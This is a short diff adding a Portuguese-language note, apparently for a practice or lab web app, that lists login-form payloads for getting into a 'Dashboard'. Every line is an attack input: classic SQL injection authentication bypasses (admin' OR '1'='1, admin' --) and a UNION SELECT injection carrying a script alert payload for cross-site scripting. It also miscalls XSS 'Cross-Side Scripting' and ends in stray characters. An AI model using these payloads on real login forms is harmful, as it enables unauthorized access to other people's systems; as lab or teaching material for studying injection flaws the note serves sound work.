@@ -1,0 +1,12 @@
+Para entrarmos na Dashboard com o SQL Injection podemos fazer:
+    Login_input = admin' OR '1'='1
+    Password = qualquercoisa(literalmente)
+
+    OU
+
+    Login_input = admin' --
+    Password = kajsbdaklçdmsdliahbdad (podemos por qualquer palavra ou letras atoa)
+
+Para entrarmos na Dashboard com o XSS (Cross-Side Scripting) e SQL Injection podemos fazer:
+    Login_input = ' UNION SELECT '1','<script>alert("XSS")</script>','3' --
+    Password = qualquercoisa(literalmente)\ z
